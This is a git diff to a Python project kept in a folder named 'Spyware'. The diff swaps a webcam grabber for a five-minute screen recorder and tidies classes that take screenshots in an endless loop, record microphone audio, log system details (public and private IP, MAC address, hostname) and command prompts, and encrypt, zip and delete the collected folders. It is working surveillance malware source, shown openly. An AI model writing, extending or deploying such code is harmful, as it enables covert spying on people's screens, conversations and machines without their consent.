@@ -17,6 +17,10 @@ import keyboard
 from cryptography.fernet import Fernet
 import zipfile
 import shutil
+import pyautogui
+from screeninfo import get_monitors
+import numpy as np
+
 
 # Base class for widely used variables
 class BaseClass:
@@ -26,44 +30,77 @@ class BaseClass:
         self.currentTime = datetime.now()
 
         # Base definition of folder_path
+        self.folder_path_recordings = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Recordings"
         self.folder_path_screenshots = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Screenshots"
         self.folder_path_soundfiles = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Soundfiles"
         self.folder_path_sys_info = r"C:\Users\deniz\PycharmProjects\Spyware\Features\Systeminformation"
         self.folder_path_cmd_prompts = r"C:\Users\deniz\PycharmProjects\Spyware\Features\CMDPrompts"
 
-class WEBCAMERA(BaseClass):
+
+class Webcamera(BaseClass):
     def __init__(self):
-        super().__init__() # Call the base class __init__ method
+        super().__init__()  # Call the base class __init__ method
 
-        self.cap = None
-        self.frame = None
+        self.recording = False
+        self.duration = 300  # 5 minutes of recording
 
-    def webcamera(self):
+        # Folder path and filename
+        self.folder_path = self.folder_path_recordings
+        self.output_file_name = "Recording.mp4"
+
+    def get_screen_size(self):
         try:
-            self.cap = VideoCapture(0)
-            self.frame, image = self.cap.read()
-        except cv2.error as e:
-            print(f"Camera is not working, or the host might not have one: {e}")
+            monitors = get_monitors()
+            main_monitor = monitors[0]
+            return main_monitor.width, main_monitor.height
+        except Exception as e:
+            print(f"Error occurred while getting screen size: {e}")
+            return None
 
-        while self.frame:
-            imshow('Webcam', image)
-            imwrite('WebCamera.png', image)
+    def record_screen(self):
+        screen_size = self.get_screen_size()
+        if screen_size is None:
+            print("Unable to determine screen size")
+            return 2
 
-            if cv2.waitKey(1) == ord('q'):
-                break
+        if not os.path.exists(self.folder_path):
+            os.makedirs(self.folder_path)
 
-        self.cap.release()
+        file_path = os.path.join(self.folder_path_recordings, self.output_file_name)
+
+        codec = cv2.VideoWriter_fourcc(*"mp4v")
+        output = cv2.VideoWriter(file_path, codec, 30.0, screen_size)
+
+        start_time = time.time()
+        end_time = start_time + self.duration
+
+        self.recording = True
+
+        # While recording is true and the recording time is below the duration
+        while self.recording and time.time() < end_time:
+            # Capture the screen time
+            frame = pyautogui.screenshot()
+            frame = cv2.cvtColor(np.array(frame), cv2.COLOR_RGB2BGR)
+
+            # Write the frame to the output video file
+            output.write(frame)
+
+            cv2.imshow('Screen Recording', frame)
+
+        self.recording = False
+        output.release()
         cv2.destroyAllWindows()
 
-class SCREENSHOTS(BaseClass):
+
+class Screenshot(BaseClass):
     def __init__(self):
-        super().__init__() # Call the base class __init__ method
+        super().__init__()  # Call the base class __init__ method
 
         # Constants
         self.counter = 0
         self.sleepAmount = 1
 
-        # Folder path and filename
+        # Folder path and folder name
         self.folder_path = self.folder_path_screenshots
         self.folder_name = f"Subfolder{date.today(), datetime.now()}"
         self.image = None
@@ -75,7 +112,7 @@ class SCREENSHOTS(BaseClass):
             os.makedirs(subfolder_path)
         return subfolder_path
 
-    def screenshots(self):
+    def screenshot(self):
         subfolder_path = self.create_subfolder()
 
         while True:
@@ -105,23 +142,25 @@ class SCREENSHOTS(BaseClass):
 
             time.sleep(self.sleepAmount)
 
-class MICROPHONE(BaseClass):
+
+class Microphone(BaseClass):
     def __init__(self):
-        super().__init__() # Call the base class __init__ method
+        super().__init__()  # Call the base class __init__ method
 
         # Constants for audio settings
-        self.sample_rate = 44100 # Normal wave length for normal sound quality
-        self.duration = 300 #Duration in seconds
+        self.audio_data = None
+        self.sample_rate = 44100  # Normal wave length for normal sound quality
+        self.duration = 300  # Duration in seconds
 
         # Folder path and filename
         self.folder_path = self.folder_path_soundfiles
         self.output_file_name = f"Soundfile.wav"
 
-    def microphone(self):
+    def audio_recording(self):
         while True:
             try:
                 # Record
-                audio_data = sd.rec(int(self.sample_rate * self.duration), samplerate = self.sample_rate, channels = 2)
+                self.audio_data = sd.rec(int(self.sample_rate * self.duration), samplerate=self.sample_rate, channels=2)
             except sd.PortAudioError as e:
                 print(f"Audio recording error: {e}")
 
@@ -132,11 +171,12 @@ class MICROPHONE(BaseClass):
 
             # Save captured audio to the file path
             file_path = os.path.join(self.folder_path, self.output_file_name)
-            wf.write(file_path, self.sample_rate, audio_data)
+            wf.write(file_path, self.sample_rate, self.audio_data)
 
-class SYS_INFO(BaseClass):
+
+class SysInfo(BaseClass):
     def __init__(self):
-        super().__init__() # Call the base class __init__ method
+        super().__init__()  # Call the base class __init__ method
 
         # Folder path and filename
         self.folder_path = self.folder_path_sys_info
@@ -177,29 +217,30 @@ class SYS_INFO(BaseClass):
         file_path = os.path.join(self.folder_path, self.output_file_name)
         with open(file_path, "a") as f:
             hostname = socket.gethostname()
-            IPAddr = socket.gethostbyname(hostname)
+            ipaddr = socket.gethostbyname(hostname)
 
             f.write("-----------------------------BEGIN-----------------------------\n\n")
 
             try:
                 public_ip = get(self.public_ip_link).text
                 f.write(f"Public IP Address: {public_ip}\n")
-            except Exception:
-                f.write("Couldn't get Public IP Address (May be due to max query)\n")
+            except Exception as e:
+                f.write(f"Couldn't get Public IP Address (May be due to max query): {e}\n")
 
             f.write(f"Processor Info: {platform.processor()}\n")
             f.write(f"OS Info: {platform.system()}\n")
             f.write(f"Detailed OS Info: {self.os_info}\n")
             f.write(f"Machine Info: {platform.machine()}\n")
             f.write(f"Hostname: {hostname}\n")
-            f.write(f"Private IP Address: {IPAddr}\n")
+            f.write(f"Private IP Address: {ipaddr}\n")
             f.write(f"Mac Address: {self.mac_address}\n\n\n")
 
             f.write(f"Current date: {self.currentDate} || Current time: {self.currentTime}\n\n")
 
             f.write("------------------------------END------------------------------\n\n\n")
 
-class CMD_PROMPTS(BaseClass):
+
+class CmdPrompts(BaseClass):
     def __init__(self):
         super().__init__()  # Call the base class __init__ method
 
@@ -232,7 +273,7 @@ class CMD_PROMPTS(BaseClass):
         except Exception as e:
             print(f"An error occurred: {str(e)}")
 
-        # Open/Create file path'
+        # Open/Create file path
         file_path = os.path.join(self.folder_path, self.output_file_name)
         with open(file_path, "a") as f:
             f.write("-----------------------------BEGIN-----------------------------\n")
@@ -243,7 +284,8 @@ class CMD_PROMPTS(BaseClass):
 
             f.write("------------------------------END------------------------------\n\n\n")
 
-class FILE_ENCRYPTION(BaseClass):
+
+class FileEncryption(BaseClass):
     def __init__(self):
         super().__init__()  # Call the base class __init__ method
 
@@ -311,10 +353,10 @@ class FILE_ENCRYPTION(BaseClass):
 
         # Zip the "encrypted_folders" directory
         with zipfile.ZipFile(self.zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
-                for root, _, files in os.walk(self.encrypted_folders_dir):
-                    for file in files:
-                        file_path = os.path.join(root, file)
-                        zip_file.write(file_path, os.path.relpath(file_path, self.encrypted_folders_dir))
+            for root, _, files in os.walk(self.encrypted_folders_dir):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    zip_file.write(file_path, os.path.relpath(file_path, self.encrypted_folders_dir))
 
     def delete_files(self):
         # Delete all the original folders
